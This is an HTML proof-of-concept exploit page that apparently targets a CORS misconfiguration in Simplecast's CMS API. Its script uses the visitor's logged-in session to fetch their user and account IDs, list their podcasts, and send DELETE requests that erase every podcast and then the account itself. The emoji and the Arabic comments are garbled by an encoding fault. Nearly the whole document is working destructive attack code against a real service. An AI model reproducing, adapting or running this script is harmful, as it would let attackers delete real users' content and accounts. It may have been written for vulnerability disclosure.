<html>
<head>
    <title>Simplecast CORS Account Deletion PoC</title>
</head>
<body>
    <h2>üß® Exploit in Progress...</h2>
    <pre id="log">Initializing...</pre>
    <script>
        const log = document.getElementById("log");
        const headers = {
            "X-Simplecast-App": "dashboard"
        };

        // Step 1: Get current user info and show headers
        fetch("https://cms-api-gateway.simplecast.com/current_user?default_podcast=true", {
            credentials: "include",
            headers
        })
        .then(res => {
            // ÿπÿ±ÿ∂ ÿßŸÑŸáŸäÿØÿ±ÿßÿ™ ÿßŸÑŸÇÿßÿØŸÖÿ© ŸÖŸÜ ÿßŸÑÿ≥Ÿäÿ±ŸÅÿ±
            let headersText = "";
            res.headers.forEach((v, k) => {
                headersText += `${k}: ${v}\n`;
            });
            log.textContent = `üì° Response Headers from /current_user:\n${headersText}\n`;

            return res.json();
        })
        .then(user => {
            if (!user || !user.accounts || !user.accounts.default) {
                throw new Error("‚ùå No account data returned - possible CORS restriction lifted");
            }

            const userId = user.id;
            const accountId = user.accounts.default.id;
            log.textContent += `‚úÖ User Info:\nUser ID: ${userId}\nAccount ID: ${accountId}\n\nüì° Getting all Podcasts...`;

            // Step 2: Fetch all podcasts
            return fetch(`https://cms-api-gateway.simplecast.com/users/${userId}/podcasts?account=${accountId}`, {
                credentials: "include",
                headers
            }).then(res => res.json()).then(podcasts => {
                const allPodcasts = podcasts.collection.map(p => p.id);
                log.textContent += `\nüéôÔ∏è Found ${allPodcasts.length} Podcasts:\n` + allPodcasts.join("\n");

                // Step 3: Delete all podcasts sequentially
                return Promise.all(allPodcasts.map(podcastId =>
                    fetch(`https://cms-api-gateway.simplecast.com/podcasts/${podcastId}`, {
                        method: "DELETE",
                        credentials: "include",
                        headers
                    }).then(res => {
                        if (!res.ok) throw new Error(`‚ùå Failed to delete podcast: ${podcastId}`);
                        log.textContent += `\nüóëÔ∏è Deleted podcast: ${podcastId}`;
                    })
                )).then(() => {
                    log.textContent += "\n\n‚úÖ All podcasts deleted.\n\nüö® Deleting account...";
                    // Step 4: Delete account
                    return fetch(`https://cms-api-gateway.simplecast.com/users/${userId}`, {
                        method: "DELETE",
                        credentials: "include",
                        headers
                    });
                }).then(res => {
                    if (res.ok) {
                        log.textContent += "\n‚úÖ Account deleted successfully!";
                    } else {
                        throw new Error("‚ùå Account deletion failed");
                    }
                });
            });
        })
        .catch(err => {
            log.textContent += "\n\n‚ö†Ô∏è Error: " + err;
        });
    </script>
</body>
</html>
